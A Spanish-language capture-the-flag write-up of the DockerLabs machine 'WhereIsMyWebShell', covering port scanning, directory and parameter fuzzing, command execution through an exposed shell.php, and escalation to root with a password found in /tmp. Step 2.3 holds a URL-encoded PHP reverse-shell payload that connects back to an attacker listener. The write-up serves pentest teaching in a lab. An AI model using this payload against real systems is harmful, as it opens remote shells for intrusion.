## Introducción

Este documento presenta la resolución completa de la máquina **WhereIsMyWebShell**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web que contiene una webshell oculta (`shell.php`) accesible directamente. Mediante fuzzing de parámetros, se identifica que la webshell acepta el parámetro `parameter`, permitiendo la ejecución remota de comandos.
A través de esta webshell, se obtiene una reverse shell como `www-data`. Finalmente, se encuentra una pista en el directorio `/tmp` que contiene la contraseña de `root`, permitiendo la escalada directa de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip WhereIsMyWebShell.zip
sudo bash auto_deplo.sh WhereIsMyWebShell.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p WhereIsMyWebShell/{content,exploits,nmap,scripts}
cd WhereIsMyWebShell
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1749787993/Ports_aa7d7b.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1749787994/Services_tc2zjr.png)

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1749787993/Gobuster_z1dhdr.png)

**Archivos encontrados:**
- `index.html` — Página básica de una academia de inglés.
  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1749787994/Index_xi3ibs.png)
- `warning.html` — Contiene una advertencia y pista sobre una webshell.
  ![Warning](https://res.cloudinary.com/dewqswzke/image/upload/v1749787996/Warning_xeq6cl.png)
- `shell.php` — Una webshell expuesta.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Fuzzing de parámetros

Se realiza fuzzing para identificar el parámetro de la webshell:

```bash
ffuf -u "http://172.17.0.2/shell.php?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 0
```

![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1749787993/Ffuf_wmxea7.png)

Se identifica el parámetro **parameter**.

### 2.2 Ejecución remota de comandos

Se prueba la ejecución con `id`:

```
http://172.17.0.2/shell.php?parameter=id
```

![Shell](https://res.cloudinary.com/dewqswzke/image/upload/v1749787994/Shell_lncpwx.png)

### 2.3 Reverse shell

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se ejecuta el payload (urlencodeado):

```
http://172.17.0.2/shell.php?parameter=php%20-r%20%27%24sock%3Dfsockopen%28%22172.17.0.1%22%2C443%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1749787994/Reverse_s9xhfj.png)

![www-data](https://res.cloudinary.com/dewqswzke/image/upload/v1749787996/www-data_kopbcu.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → root

Se explora el sistema y se encuentra una pista en el directorio `/tmp`:

![Secret](https://res.cloudinary.com/dewqswzke/image/upload/v1749793375/Secret_urkqoy.png)

El archivo contiene la contraseña de `root`. Se cambia al usuario:

```bash
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1749793375/SuRoot_nvdqdc.png)
